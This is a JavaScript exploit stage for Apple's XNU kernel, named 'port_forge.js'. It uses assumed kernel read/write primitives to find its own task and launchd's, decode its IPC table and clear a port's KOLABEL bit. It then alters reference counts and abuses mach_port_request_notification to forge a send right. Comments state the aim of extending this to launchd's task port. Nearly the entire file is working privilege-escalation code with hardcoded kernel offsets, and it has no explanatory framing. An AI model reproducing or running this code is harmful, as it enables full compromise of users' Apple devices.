// port_forge.js — Complete port forging implementation
//
// Corrected XNU 24.6 offsets from kernelcache disassembly:
//   entryObject = 0x08
//   ipNsRequest = 0x48 (was 0x58)
//   IO_BITS_KOLABEL = 0x400 (bit 10 in io_bits)

log('=== Port Forge ===');

// --- Helper: kallocArrayDecode ---
function kallocDecode(ptr) {
  // KALLOC_ARRAY_TYPE_SHIFT = 46, zone_mask = 0x400000000000
  var zoneMask = '0x400000000000';
  if (band(ptr, zoneMask) != '0x0') {
    // Zone bit set: clear bottom 5 bits
    return band(ptr, '0xffffffffffffffe0');
  } else {
    // Page-aligned: clear page offset, set zone bit
    return bor(band(ptr, '0xffffffffffffc000'), zoneMask);
  }
}

// --- Helper: get port ipc_port kernel address from our IPC table ---
function getPortAddr(table, portName) {
  var idx = shr(portName, '0x8');
  var entryAddr = add(table, mul(idx, '0x18'));
  // ie_object at entry + 0x08 (XNU 24.6 reordered struct)
  var ieObj = kread64(add(entryAddr, '0x8'));
  return strip(ieObj);
}

// --- Helper: get entry address for a port ---
function getEntryAddr(table, portName) {
  var idx = shr(portName, '0x8');
  return add(table, mul(idx, '0x18'));
}

// Step 1: Find our task and launchd
var kt = kread64(slide('0xc1bf78'));
var task = kread64(add(kt, '0x30'));
var ourPid = getpid_native();
var ourTask, launchdTask;
for (var i = 0; i < 600; i++) {
  if (task == '0x0' || task == kt) break;
  var procRO = kread64(add(task, '0x3e0'));
  if (procRO == '0x0') { task = kread64(add(task, '0x30')); continue; }
  var proc = kread64(procRO);
  if (proc == '0x0' || proc.indexOf('0xffffff') != 0) { task = kread64(add(task, '0x30')); continue; }
  var p = parseInt(kread32(add(proc, '0x60')), 16);
  if (p == ourPid) ourTask = task;
  if (p == 1) launchdTask = task;
  if (ourTask && launchdTask) break;
  task = kread64(add(task, '0x30'));
}
log('ourTask = ' + ourTask);
log('launchdTask = ' + launchdTask);

// Step 2: Decode our IPC table
var ourSpace = strip(kread64(add(ourTask, '0x318')));
var ourTableStripped = strip(kread64(add(ourSpace, '0x20')));
var ourTable = kallocDecode(ourTableStripped);
log('ourTable = ' + ourTable);

// Verify: port 0x203 should give us a valid ipc_port
var port203 = getPortAddr(ourTable, '0x203');
log('port 0x203 ipc_port = ' + port203);
var rcv = strip(kread64(add(port203, '0x40')));
log('receiver = ' + rcv + ' (should match ourSpace ' + ourSpace + ')');
if (rcv != ourSpace) {
  log('ERROR: table decode wrong, aborting');
} else {
  log('[+] Table decode VERIFIED');

  // Step 3: Create a new port via mach_port_construct
  var optBuf = umalloc(16);
  uwrite32(optBuf, '0x8'); // MPO_INSERT_SEND_RIGHT
  uwrite32(add(optBuf, '0x4'), '0x0');
  var portBuf = umalloc(8);
  var kr = callSymbol('mach_port_construct', '0x203', optBuf, '0x0', portBuf);
  var newPort = uread32(portBuf);
  ufree(optBuf); ufree(portBuf);
  log('New port: ' + newPort + ' (kr=' + kr + ')');

  // Step 4: Get new port's kernel address
  var newPortAddr = getPortAddr(ourTable, newPort);
  log('New port kaddr: ' + newPortAddr);

  // Step 5: Get launchd's first thread kernel address
  var ldThread = kread64(add(launchdTask, '0x58'));
  log('launchd thread: ' + ldThread);

  // For PortRightInserter, we need launchd's TASK PORT ipc_port address.
  // We can't read launchd's IPC table (crashes).
  // Alternative: forge a right to launchd's task by creating a thread there.
  // But that also needs a task port...
  //
  // SIMPLEST TEST: forge a right to our OWN task port first (verify the mechanism works)
  // Then adapt for launchd.

  log('');
  log('[*] Testing port forge on our OWN task port...');
  var targetPortKaddr = port203; // Our task port

  // Step 6: Backup io_bits, clear KOLABEL
  var IO_BITS_KOLABEL = '0x400';
  var backupBits = kread32(targetPortKaddr);
  log('backup io_bits: ' + backupBits);
  var needsFix = band(backupBits, IO_BITS_KOLABEL);
  if (needsFix != '0x0') {
    // Clear KOLABEL bit
    var newBits = band(backupBits, '0xfffffffffffffbff');
    kwrite32(targetPortKaddr, newBits);
    log('Cleared KOLABEL');
  }

  // Step 7: Increment refcount (ip_srights at offset +0x0c or ip_references)
  // On XNU, ip_references is at ipc_object+0x04 (io_references)
  // io_references is a uint32 at object+0x04
  var refCount = kread32(add(targetPortKaddr, '0x4'));
  log('refcount before: ' + refCount);
  var newRef = add(refCount, '0x1');
  kwrite32(add(targetPortKaddr, '0x4'), newRef);
  log('refcount after: ' + kread32(add(targetPortKaddr, '0x4')));

  // Step 8: Write target port into our new port's ip_nsrequest
  // XNU 24.6: ip_nsrequest at +0x48 (from disassembly)
  kwrite64(add(newPortAddr, '0x48'), targetPortKaddr);
  log('Wrote target into new port ip_nsrequest');

  // Step 9: Call mach_port_request_notification(MACH_NOTIFY_NO_SENDERS)
  // This will create a send-once right to the target port
  // mach_port_request_notification(task, name, msgid, sync, notify, notify_type, &previous)
  // MACH_NOTIFY_NO_SENDERS = 70
  // notify_type = MACH_MSG_TYPE_MAKE_SEND_ONCE = 21
  var prevBuf = umalloc(8);
  kr = callSymbol('mach_port_request_notification',
    '0x203',     // task_self
    newPort,     // port name
    '0x46',      // MACH_NOTIFY_NO_SENDERS (70)
    '0x0',       // sync count
    newPort,     // notify port (same port)
    '0x15',      // MACH_MSG_TYPE_MAKE_SEND_ONCE (21)
    prevBuf      // previous notification port
  );
  var prevPort = uread32(prevBuf);
  ufree(prevBuf);
  log('mach_port_request_notification kr=' + kr + ' previous=' + prevPort);

  if (kr == '0x0' && prevPort != '0x0') {
    log('[+] Got send-once right: ' + prevPort);

    // Step 10: Switch from send-once to send right by patching ie_bits
    var prevEntry = getEntryAddr(ourTable, prevPort);
    // ie_bits at entry+0x00 on XNU 24.6 (reordered: bits first, not object)
    var prevBits = kread32(prevEntry);
    log('previous entry ie_bits: ' + prevBits);

    // Clear type bits and set MACH_PORT_TYPE_SEND = 0x10000
    var IE_BITS_TYPE_MASK = '0x1f0000';
    var MACH_PORT_TYPE_SEND = '0x10000';
    var clearedBits = band(prevBits, '0xffffffffffe0ffff'); // clear type
    var sendBits = bor(clearedBits, MACH_PORT_TYPE_SEND);
    kwrite32(prevEntry, sendBits);
    log('Patched to send right: ' + kread32(prevEntry));

    log('[+] PORT FORGE SUCCEEDED!');
    log('[+] Forged port name: ' + prevPort);
    log('[+] Points to target ipc_port: ' + targetPortKaddr);
  } else {
    log('[-] mach_port_request_notification failed');
    if (kr != '0x0') {
      var errStr = callSymbol('mach_error_string', kr);
      log('Error: ' + uread_str(errStr, 128));
    }
  }

  // Restore refcount
  kwrite32(add(targetPortKaddr, '0x4'), refCount);
  // Restore io_bits
  if (needsFix != '0x0') {
    kwrite32(targetPortKaddr, backupBits);
  }

  // Clean up new port
  callSymbol('mach_port_destruct', '0x203', newPort, '0x0', '0x0');
}

'port_forge_done';
